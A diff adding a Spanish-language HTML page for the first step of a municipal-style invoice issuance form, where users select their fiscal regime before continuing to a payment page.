@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de datos</title>
+    <link rel="shortcut icon" href="src/img/favicon.png">
+    <link rel="preload" href="src/css/normalize.css" as="style">
+    <link rel="stylesheet" href="src/css/normalize.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="preload" href="src/css/styles.css" as="style">
+    <link rel="stylesheet" href="src/css/styles.css">
+  </head>
+
+</head>
+<body>
+    <div class="sombra">
+        <nav class="navegacion">
+            <div>
+                <a href="index.html"><img class="logo" src="src/img/gobierno_de_monterrey_logo.png" alt="Logotipo"></a>
+            </div>
+            <div class="navegacion__elemento">
+                <a class="navegacion__enlace" href="index.html">Inicio</a>
+                <a class="navegacion__enlace" href="aviso.html">Facturas</a>
+                <a class="navegacion__enlace" href="modo_pago_consulta.html">Consulta Facturas</a>
+                <a class="navegacion__enlace" href="contacto.html">Contacto</a>
+            </div>
+            <div class="navegacion__elemento">
+                <a class="boton boton--mayus" href="ayuda.html">Ayuda</a>
+            </div>
+        </nav>
+    </div>
+    <main>
+        <section class="progreso">
+            <div class="progreso__elemento">
+                <p class="progreso__texto">Paso 1</p>
+                <div class="progreso__circulo progreso__circulo--actual">
+                </div>
+            </div>
+            <div class="progreso__elemento">
+                <p class="progreso__texto">Paso 2</p>
+                <div class="progreso__circulo">
+                </div>
+            </div>
+            <div class="progreso__elemento">
+                <p class="progreso__texto">Paso 3</p>
+                <div class="progreso__circulo">
+                </div>
+            </div>
+            <div class="progreso__elemento">
+                <p class="progreso__texto">Paso 4</p>
+                <div class="progreso__circulo">
+                </div>
+            </div>
+            <div class="progreso__elemento">
+                <p class="progreso__texto">Paso 5</p>
+                <div class="progreso__circulo">
+                </div>
+            </div>
+        </section>
+        <section class="contenedor">
+            <div class="grid">
+                <div>
+                    <h1 class="titulo titulo--cuerpo">Emisión de Factura</h1>
+                    <h2 class="subtitulo">Paso 1: Verificación de datos de identificación del contribuyente.</h2>
+                    <br>
+                    <p class="texto texto--pasos">Selecciona tu regimen fiscal para identificar los datos necesarios: </p>
+                    <form name="formulario" action="modo_pago.html">
+                            <div class="formulario__contenido">
+                                <select class="select" name="regimen" onchange="cambia()" required>
+                                    <option disabled selected value="">Régimen Fiscal</option>
+                                    <option value="1">Persona Física</option>
+                                    <option value="2">Persona Moral</option>
+                                </select>
+                            </div>
+                            <br><br>
+                            <div class="centrar"><input type="submit" class="boton" value="Siguiente"></div>
+                    </form>
+                </div>
+                <div class="constancia centrar" id="constancia"></div>
+                
+            </div>
+        </section>
+    </main>
+    <br><br>
+<script src="src/scripts/script.js"></script>
+</body>
+</html>
